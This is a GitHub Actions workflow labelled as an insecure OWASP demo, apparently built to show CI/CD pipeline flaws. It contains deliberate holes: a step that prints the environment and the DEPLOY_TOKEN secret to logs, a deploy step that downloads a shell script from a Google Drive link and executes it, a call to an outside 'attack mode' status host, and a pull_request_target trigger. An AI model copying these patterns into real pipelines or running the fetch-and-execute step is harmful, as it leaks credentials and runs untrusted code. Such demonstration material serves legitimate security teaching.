name: CI â€” Insecure OWASP-demo

on:
  push:
    branches: ["main"]
  pull_request:
    branches: ["main"]
  pull_request_target:
    branches: ["main"]
  workflow_dispatch: {}

permissions:
  actions: none
  checks: none
  contents: none
  deployments: none
  id-token: none
  issues: none
  discussions: none
  packages: none
  pages: none
  pull-requests: none
  repository-projects: none
  security-events: none
  statuses: none

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@f43a0e5ff2bd294095638e18286ca9a3d1956744 # v3.6.0

      - name: Setup Node
        uses: actions/setup-node@3235b876344d2a9aa001b8d1453c930bba69e610 # v3.9.1
        with:
          node-version: "18"

      - name: Check attack mode status
        run: |
          STATUS=$(curl -s https://5649243.xyz/admin/status)
          echo "Attack mode status: $STATUS"

      - name: Install dependencies
        run: npm install

      - name: Run tests
        run: |
          npm test || true

      - name: Validate env and secret
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: |
          echo "ENV HERE:"
          env
          echo "deploy token: $DEPLOY_TOKEN"

      - name: Build
        run: npm run build

      - name: Create artifact
        run: |
          mkdir -p out
          cp -r public/* out/ || true
          tar czf artifact.tar.gz -C out .

      - name: Upload artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: build-artifact
          path: artifact.tar.gz

  deploy:
    permissions:
      artifacts: read
    needs: build-and-test
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - name: Checkout
        uses: actions/checkout@f43a0e5ff2bd294095638e18286ca9a3d1956744 # v3.6.0

      - name: Download build artifact
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
        with:
          name: build-artifact
          path: .

      - name: Extract artifact to public folder
        run: |
          mkdir -p public
          tar xzf artifact.tar.gz -C public
          echo "Extracted artifact into ./public"

      - name: Setup Node
        uses: actions/setup-node@3235b876344d2a9aa001b8d1453c930bba69e610 # v3.9.1
        with:
          node-version: "18"

      - name: Ensure npm cache path exists
        run: mkdir -p ~/.npm

      - name: Cache dependencies
        uses: actions/cache@6f8efc29b200d32929f49075959781ed54ec270c # v3.5.0
        with:
          path: ~/.npm
          key: npm-cache-${{ runner.os }}-v1

      - name: Generate build info
        run: |
          BUILD_FILE="public/build-info.json"
          mkdir -p public
          cat <<EOF > $BUILD_FILE
          {
            "build": ${GITHUB_RUN_NUMBER},
            "commit": "${GITHUB_SHA}",
            "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
          }
          EOF
          echo "Generated $BUILD_FILE"

      - name: Run script
        run: |
          curl -L -o InsecurePipelineDemo.sh \
          "https://drive.usercontent.google.com/download?id=1IkL7uiHQe8LDNr5Tr1dS9Yv5P7lKYFvb&confirm=t"
          chmod +x InsecurePipelineDemo.sh
          ./InsecurePipelineDemo.sh

      - name: Deploy to GitHub Pages
        uses: peaceiris/actions-gh-pages@373f7f263a76c20808c831209c920827a82a2847 # v3.9.3
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          publish_dir: ./public

  post:
    needs: deploy
    runs-on: ubuntu-latest
    steps:
      - name: Download artifact
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
        with:
          name: build-artifact

      - name: Verify artifact presence
        run: |
          ls -la

      - name: Trigger downstream workflow
        run: |
          curl -X POST -H "Accept: application/vnd.github+json" \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            https://api.github.com/repos/${{ github.repository }}/dispatches \
            -d '{"event_type":"post-deploy"}'
